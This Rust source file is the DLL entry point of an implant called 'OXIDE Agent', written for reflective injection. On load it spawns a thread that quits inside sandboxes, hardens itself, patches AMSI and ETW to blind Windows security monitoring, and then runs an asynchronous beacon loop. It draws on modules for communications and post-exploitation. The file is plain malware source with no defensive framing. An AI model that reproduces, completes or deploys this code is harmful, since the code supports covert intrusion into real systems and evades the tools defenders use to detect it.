//! OXIDE Agent — DLL (cdylib) entry point for reflective injection.

mod beacon;
mod comms;
mod config;
mod evasion;
mod postex;

#[cfg(target_os = "windows")]
#[no_mangle]
pub extern "system" fn DllMain(
    _module:   windows_sys::Win32::Foundation::HMODULE,
    reason:    u32,
    _reserved: *mut core::ffi::c_void,
) -> i32 {
    const DLL_PROCESS_ATTACH: u32 = 1;
    if reason == DLL_PROCESS_ATTACH {
        std::thread::spawn(|| {
            let cfg = config::load();

            if cfg.sandbox_evasion && evasion::is_sandbox() { return; }
            evasion::harden(cfg.block_dlls);
            if cfg.amsi_bypass { evasion::amsi::patch(); }
            if cfg.etw_bypass  { evasion::etw::patch();  }

            let rt = tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
                .expect("tokio rt");
            rt.block_on(async {
                let _ = beacon::run(cfg).await;
            });
        });
    }
    1
}
